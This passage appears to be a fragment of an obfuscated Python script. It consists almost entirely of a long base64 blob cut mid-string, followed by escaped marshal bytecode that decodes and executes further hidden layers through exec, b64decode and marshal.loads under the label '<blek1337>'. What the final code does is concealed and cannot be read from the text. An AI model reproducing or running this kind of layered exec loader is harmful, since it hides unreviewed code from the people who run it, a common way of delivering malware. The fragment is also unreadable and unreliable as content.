pWV1hwV01GWnZZbTFSZDAxVlpHeFNSa3BQVld0a2IyRnNjRlpWYTBwclRWZG9TbGRxVG05VWJVcEpXbnBDVlZaV1NrZFpNRnB2VTFadmVscEZOVTVYUjJOM1ZqSjBhMUl4YTNsV2ExWlNWa1UxY0ZacVFtRk9WbXcyVTIwNWFGSXdjRWhhVlZKVFdWWkpkMWR0Y0dGV1ZrcERWRlZhZDFkWFJraGxSbkJPVjBkamQxWXlkR3RTTVd0NVZtdFdVbFpGV25CVmJuQnpZakZrY21GRk9WcE5iRnBKVld4U1YxZFdUa2hhUkU1VlZsZG9URmRVU2xkU1ZrWlZVbXhzVkZJeVVYcFdSbFpoVGtVMVJrMVZWbEppVlRWelZXdFdSMDB4YTNsbFJGSlBVbFJHUmxadE1VOWlSa3BHVW1wT1dGSlhhSFZhUkVGNFVqSldSVlZyTlZOU1ZYQnhWMnhXYTFsWFJrZGhSV2hQVWtkb1lWbHNhRzlqTVd4WlkwVmFiR0Y2UlRKWFdHd3dWMVpPU0dGSVNsaFdiRzh3Vkd0VmVGSldjRFpoUjJ4WFpXMTRlVmRyV210T1IwcEhVVzVPYkZKR1NrOVZhMVpoWVd4d1ZsVnJTbXROVjJoS1YycE9hMVJzU25WYWVrSlZWbFpLUkZwWGVHOVRWbTk2V2tVNVUySnRZM2RXUmxaVFVURnJlVlpyVmxKWFIxSmFWVEJrYTAweFVsWlhhbEpQVWxSR1JsbFZaRTlpUmtwR1VtcE9XRkpYYUhWYVZWVjRZekpXUlZWck5WTlNWbG96VmpCV2IySnRVWGROU0doc1VrWkthRlZxUW1GaGJIQldWV3RLVGsxcmNGbFZiVFZ6WVdzeGRHRkhPVnBoTVc4d1ZHdGFkMU5HU25SVWJYaFRVbFZXTTFZeWVHOWlNa3BIWVROb2JGSkdTbWhWYWtKaFlXeHdWbFZyU2s1V01IQkpWREZrYjFsV1RrWk9WM0JoVmxkU1IxUnNXbTlUVm05NldrVTFWRkpZUW5GWGJGWlRVV3N4VjJGRmJHRk5NbEpQVlcwMWJrMUdVbFpWYTA1YVRXeGFSbFZXYUd0aGJVcEpXbnBDVlZaV1NsaFhWRXBYVWxaR1dWcEdiRlJTTWxGNlZrWldZVTVGTlVaTlZWWlNZbFUxYzFWcVJuZGlNV1JHV1hwQ1VGSnRlREJhVldRMFlVZFdjbFpxV2xWWFNFSnhVM3BHYjFOWFJraGtSbkJYWW0xamQxWkdWbE5pYXpsSVUyeG9VRll6VW5KV2FrNXZZekZXU0dWRVVrOVNWRVpHVlcweFQySkdTa1pTYWs1WVVsZG9kVnBFUVhoU01sWkZWV3MxVTFKVmJ6SldNRlp2WW0xUmQwNVZaR3hTUmtwUFZXdFdTMkZzY0ZaVmEwcHJUVmRvU2xkcVRtdFViRXAxV25wQ1ZWWldTblpYVkVwWFVsWkdXVnBHYkZSU01sRXdWa1prTkU1Rk5VWk5WVlpUVjBWS1dsVXdaR3ROTVZKVlVtcFNUMUp1UWtsVmJURlBZa1pLUmxKWWNGcGlSMUpJV2xaa1RtVlhSa2hoUjJ4VFltMWpkMVl5ZEd0U01XdDVWbXRXVWxaRlNtaFdNR1J2WXpGa1ZWSnFVazlTYmtKSlZXMHhUMkpHU2taU1dHaGFZVEpOTVZsVlduZFRWbEowVkcxNFUwMUdWWGhXTUZadlltMVJkMDFWYkZSaVZUVnpWV3RXUm1WR1pFWmhSelZyVFVSR1NGcFZVbE5VYkVwR1UyMXdZVlpXU2tOYVJFcFBZekpXUlZWck5WTlNiSEJ4VjJ4V1UxRnRVWGhoUld4aFRUSlNUMVZ0Tlc1TlJsSldWV3RPV2sxc1drbFdNakZ2VjFaS05sVlVVbGhXZWtVd1dXdGtSMDVzU2xsalJUVnNZbFV4ZVZZd1ZtOWlNa1Y0WWtaa2JGSkdTazlWYTJScVRrWnNjMWw2Vm1oTmJFcFpXbFZrTkZWWFNrbGFla0pWVmxaS1NGZFVTbGRTVmtaWldrWnNWRkl5VVhwV1JsWmhUa1UxUmsxVlZsSmlia0phVlRCa2EwMHhVbkpYYWxKUFVsUkdSbFZYTVU5aVJrcEdVbXBPV0ZKWGFIVmFSRUY0VWpKV1JWVnJOVk5TTW1oeFYyeFdVMUZ0VVhoaFJXeGhUVEpvVDFscmFHNU5SbEpXVld0YWFsSnRhRXBYYWs1clZHc3hXVnA2UWxoaE1sSklWMVJLVjFKV1JsVlViV3hYVFVadk1WZFljRXRpTWtaSVUydGtiRkpHU21oVmFrSmhZV3h3VmxWclNrNVNia0phV1ZWa05GZHJNVmxhZWtKWVlUSlNTRmRVU2xkU1ZrWlZVbTFzVTJWdGVIWldNblJ2VkRGcmVWWnJhRk5XUmxwYVZUQmthMDB4VWxaaFJYUmFUV3hhUmxWV1VrZFhWazVJV2tST1ZWWldiekJVYTFWNFVsWkdkRlJ0ZUZOU1ZWbDZWMVJLTkU1Rk5VWk5WVlpYWWxVMWMxVnJWa2ROTVdSR1lVYzFhMDFFUmtoYVZWSlRWR3hLUmxOdGNHRldWMUpvV1ZWYWIxTkZOVVZoUm5CcFYwZG9lbGRXYUhkU2JWWnlUVlJhV21WWVVscFZNR1J2WTJ4a1YxZHFVazlTVkVaR1YyNXdiMkZXV2paaVNFcGhVbTFSTUZscldrTmpNbFpGVldzMVUxSldjSEZYYkZaVFVXMVJlR0ZGYkdGTk1sSlBWVzAxYmsxR1VsWlZhMDVzWWtkb1NsZHFUbXRVTVVwMVducENWVlpXU2tSWFZFcFhVbFpHV1ZwR2JGUlNNbEY2VmtaV1lVNUZOVVpOVlZab1VqQTFjMVZyVmtkTk1XUkdZVWMxYkZKVVJucGFWVkpUVkd4S1JsWnVWbFJOVlRWNVZVWk9jMWt5VmtWUldIQlpVMGRvY2xkV1dqUk9SVEZGVjIxc1dsZEZOWE5VYlhCVFdUSldTRlZ0YUZsVFIyUXpWR3RrVjA1R2NGaFViVTVzVWpGS2IxZEZhRk5oVlRWeFZXMTBZVll3TlRKWGEyUlhXVEpXU0ZKVVZsbFRSMlF6VkZWb1Mxa3lWa1ZSVkVaWlUwZGtNMVJWV2pST1JURkZVVzFPYkZKRlJqTlpNbmcwVGtVeFJWWnRUbXhTUlVZelYwVm9ibVF3TVVkbFJGSk9Va1ZLYWxwVlpHRmhSbWhJVGtSb1dtSllhSE5aV0hCR1pXc3hObGw1ZEZsVFIyaHlWMVphTkU1Rk1VVmFlbWhwVm5wc2NscEdaRFJpUmtKelpVUlNUbEpGV21wYVZWSkNaREZvU1ZvelpFNVNibWN3VkZWU1EyVnNhRWxhTTJSUFVtNW5NRlJWVWtOWk1sWkZVVmhrV1ZOSFpETlVWVm8wVGtVeFJXRkhUbXhTUlVZelYwVm9ibVZGTVhObFJGSk9Va1ZXZFZNeFRuSlFVMnhqWlVSQmVsaElhR3RaVm5nMFRVUmFhVmxZVG14T2FsSmpaVWRTYUZoSVozZE9SMVkwV2xkT1kyVkhVbWhZU0ZKcFRtcFNhMXBYVG5aYVIxWmpaVWRGTlZoSVozZE5TRXBqWlVSQk1WaElaM2ROUm5nMFRVUkNZMlZFUVhkamJIZzBUVVJXWTJWRVFYZFlTR2QzVFVaNE5FMUVRbU5sUjFwb1dFYzBPRmx0ZUd4aGVrVjZUWHBqSzFoSWFHdFpWbmcwVFVSbk9HSlhPV3RrVjNoc1VHeDRORTFFUm1ObFJFRjNXRWhuZDAxR2VEUk5SRUo2V0VobmQwNUdlRFJOUkVKalpVUkJkMWhJWjNkTlJuZzBUVVJvWTJWRVFYZFlTR2Q0VFd4NE5FMUVSWEJZU0dkM1RURjRORnBIUm1ObFJFRXpZbGRHZVdNeWFHaGlSbmcwV2tkR1kyVkVRVEJhV0doc1dURjRORnBIUm1ObFJFRXhZa2M1YUZwSVRtTmxSMFUxV0VobmQwMUlTbU5sUkVFeFdFaG5kMDFHZURSTlJFSmpaVVJCZDJOc2VEUk5SRlpqWlVSQmQxaElaM2ROUm5nMFRVUkNZMlZIV21oWVJ6UTRXVzE0YkdGNlJYcE5lbU1yV0Vob2ExbFdlRFJOUkdjNFlsYzVhMlJYZUd4UWJIZzBUVVJHWTJWRVFYZFlTR2QzVFVaNE5FMUVRbnBZU0dkM1RrWjRORTFFUW1ObFJFRjNXRWhuZDAxR2VEUk5SR2hqWlVSQmQxaElaM2hOYkhnMFRVUkZia3RUYXowcFhIZ3dNMXg0WkdGY2VEQTJZbUZ6WlRZMFhIaGtZVng0TURSbGVHVmpYSGhrWVZ4MFlqWTBaR1ZqYjJSbFhIaGhPVng0TURCeVhIZ3dOVng0TURCY2VEQXdYSGd3TUhKY2VEQTFYSGd3TUZ4NE1EQmNlREF3WEhobVlWeHVQR0pzWldzeE16TTNQbHg0WkdGY2VEQTRQRzF2WkhWc1pUNWNlREF4WEhnd01GeDRNREJjZURBd2MxeDRNRFJjZURBd1hIZ3dNRng0TURCY2VEQTRYSGd3TUZ4NE1USmNlREF4S1Z4NE1ETmNlR1JoWEhnd04yMWhjbk5vWVd4Y2VHUmhYSGd3TkdWNFpXTmNlR1JoWEhnd05XeHZZV1J6WEhoaE9WeDRNREJ5WEhnd05WeDRNREJjZURBd1hIZ3dNSEpjZURBMVhIZ3dNRng0TURCY2VEQXdYSGhtWVZ4dVBHSnNaV3N4TXpNM1BseDRaR0ZjZURBNFBHMXZaSFZzWlQ1Y2VEQXhYSGd3TUZ4NE1EQmNlREF3YzF4NE1EUmNlREF3WEhnd01GeDRNREJjZURBNFhIZ3dNRng0TVRKY2VEQXhKeWtwKVx4MDNceGRhXHgwNmJhc2U2NFx4ZGFceDA0ZXhlY1x4ZGFcdGI2NGRlY29kZVx4YTlceDAwclx4MDVceDAwXHgwMFx4MDByXHgwNVx4MDBceDAwXHgwMFx4ZmFcbjxibGVrMTMzNz5ceGRhXHgwODxtb2R1bGU+XHgwMVx4MDBceDAwXHgwMHNceDA0XHgwMFx4MDBceDAwXHgwOFx4MDBceDEyXHgwMSlceDAzXHhkYVx4MDdtYXJzaGFsXHhkYVx4MDRleGVjXHhkYVx4MDVsb2Fkc1x4YTlceDAwclx4MDVceDAwXHgwMFx4MDByXHgwNVx4MDBceDAwXHgwMFx4ZmFcbjxibGVrMTMzNz5ceGRhXHgwODxtb2R1bGU+XHgwMVx4MDBceDAwXHgwMHNceDA0XHgwMFx4MDBceDAwXHgwOFx4MDBceDEyXHgwMScpKQ==)\x03\xda\x06base64\xda\x04exec\xda\tb64decode\xa9\x00r\x05\x00\x00\x00r\x05\x00\x00\x00\xfa\n<blek1337>\xda\x08<module>\x01\x00\x00\x00s\x04\x00\x00\x00\x08\x00\x12\x01)\x03\xda\x07marshal\xda\x04exec\xda\x05loads\xa9\x00r\x05\x00\x00\x00r\x05\x00\x00\x00\xfa\n<blek1337>\xda\x08<module>\x01\x00\x00\x00s\x04\x00\x00\x00\x08\x00\x12\x01)\x03\xda\x07marshal\xda\x04exec\xda\x05loads\xa9\x00r\x05\x00\x00\x00r\x05\x00\x00\x00\xfa\n<blek1337>\xda\x08<module>\x01\x00\x00\x00s\x04\x00\x00\x00\x08\x00\x12\x01'))'))